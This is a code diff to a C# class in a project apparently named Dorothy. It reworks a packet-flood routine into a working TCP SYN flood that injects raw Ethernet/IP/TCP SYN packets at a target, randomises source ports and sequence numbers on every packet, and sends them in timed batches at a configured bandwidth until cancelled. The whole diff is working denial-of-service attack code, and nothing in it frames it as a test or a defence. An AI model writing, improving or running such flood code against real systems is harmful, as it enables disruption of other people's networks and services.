@@ -36,7 +36,7 @@ namespace Dorothy.Models
 
         public async Task StartAsync()
         {
-            Logger.Info("Starting TCP Flood attack.");
+            Logger.Info("Starting TCP SYN Flood attack.");
 
             try
             {
@@ -58,73 +58,87 @@ namespace Dorothy.Models
                     throw new Exception($"Device {_device.Name} does not support packet injection.");
                 }
 
-                // Construct the Ethernet packet
-                var ethernetPacket = new EthernetPacket(_sourceMac, new PhysicalAddress(_targetMac), EthernetType.IPv4);
+                var random = new Random();
+                var ethernetPacket = new EthernetPacket(
+                    _sourceMac,
+                    new PhysicalAddress(_targetMac),
+                    EthernetType.IPv4);
 
-                // Construct the IP packet
-                var ipPacket = new IPv4Packet(IPAddress.Parse(_sourceIp), IPAddress.Parse(_targetIp))
+                var ipPacket = new IPv4Packet(
+                    IPAddress.Parse(_sourceIp),
+                    IPAddress.Parse(_targetIp))
                 {
                     Protocol = ProtocolType.Tcp,
                     TimeToLive = 128
                 };
 
-                // Construct the TCP SYN packet
-                var tcpPacket = new TcpPacket((ushort)GenerateRandomPort(), (ushort)_targetPort)
+                var tcpPacket = new TcpPacket(
+                    (ushort)random.Next(1024, 65535),
+                    (ushort)_targetPort)
                 {
+                    Flags = TcpFlags.Syn,
                     WindowSize = 8192,
-                    UrgentPointer = 0,
-                    SequenceNumber = 0
+                    SequenceNumber = (uint)random.Next(),
+                    PayloadData = new byte[0]  // SYN packets don't have payload
                 };
-    
-                tcpPacket.SequenceNumber = 0; // Optionally set the sequence number
 
-                // Assign the TCP packet to the IP packet's payload
                 ipPacket.PayloadPacket = tcpPacket;
-
-                // Assign the IP packet to the Ethernet packet's payload
                 ethernetPacket.PayloadPacket = ipPacket;
 
-                // Calculate packets per second based on bytes per second
-                var bytesPerSecondValue = _bytesPerSecond;
-                int packetsPerSecond = (int)(bytesPerSecondValue / ethernetPacket.Bytes.Length);
-                packetsPerSecond = Math.Max(packetsPerSecond, 1);
-                double delay = 1000.0 / packetsPerSecond;
+                double packetSize = ethernetPacket.Bytes.Length;
+                int packetsPerSecond = (int)Math.Ceiling(_bytesPerSecond / packetSize);
+                int batchSize = 1000;
+                double delayMicroseconds = (1_000_000.0 * batchSize) / packetsPerSecond;
 
-                Logger.Info($"TCP Flood: Sending {packetsPerSecond} packets per second ({_bytesPerSecond / 125_000} Mbps).");
+                Logger.Info($"TCP SYN Flood: Sending {packetsPerSecond} packets per second ({_bytesPerSecond / 125_000} Mbps).");
 
-                while (!_cancellationToken.IsCancellationRequested)
+                await Task.Run(() =>
                 {
-                    try
+                    var stopwatch = new System.Diagnostics.Stopwatch();
+                    while (!_cancellationToken.IsCancellationRequested)
                     {
-                        injectionDevice.SendPacket(ethernetPacket);
-                    }
-                    catch (Exception ex)
-                    {
-                        Logger.Error(ex, "Failed to send TCP packet.");
-                    }
+                        try
+                        {
+                            stopwatch.Restart();
+                            for (int i = 0; i < batchSize && !_cancellationToken.IsCancellationRequested; i++)
+                            {
+                                tcpPacket.SourcePort = (ushort)random.Next(1024, 65535);
+                                tcpPacket.SequenceNumber = (uint)random.Next();
+                                injectionDevice.SendPacket(ethernetPacket);
+                            }
 
-                    await Task.Delay(TimeSpan.FromMilliseconds(delay), _cancellationToken)
-                        .ContinueWith(t => { }, TaskContinuationOptions.OnlyOnCanceled);
-                }
+                            double elapsedMicroseconds = stopwatch.ElapsedTicks * 1_000_000.0 / System.Diagnostics.Stopwatch.Frequency;
+                            if (elapsedMicroseconds < delayMicroseconds)
+                            {
+                                int remainingMicroseconds = (int)(delayMicroseconds - elapsedMicroseconds);
+                                if (remainingMicroseconds > 1000)
+                                {
+                                    Thread.Sleep(remainingMicroseconds / 1000);
+                                }
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            Logger.Error(ex, "Failed to send TCP packet.");
+                        }
+                    }
+                    return Task.CompletedTask;
+                }, _cancellationToken);
             }
             catch (TaskCanceledException)
             {
-                Logger.Info("TCP Flood attack was canceled.");
+                Logger.Info("TCP SYN Flood attack was canceled.");
             }
             catch (Exception ex)
             {
-                Logger.Error(ex, "Error during TCP Flood attack.");
+                Logger.Error(ex, "TCP SYN Flood attack failed.");
+                throw;
             }
             finally
             {
                 _device?.Close();
-                Logger.Info("TCP Flood attack stopped.");
+                Logger.Info("TCP SYN Flood attack stopped.");
             }
-        }
-
-        private int GenerateRandomPort()
-        {
-            return new Random().Next(1024, 65535);
         }
 
         public void Dispose()
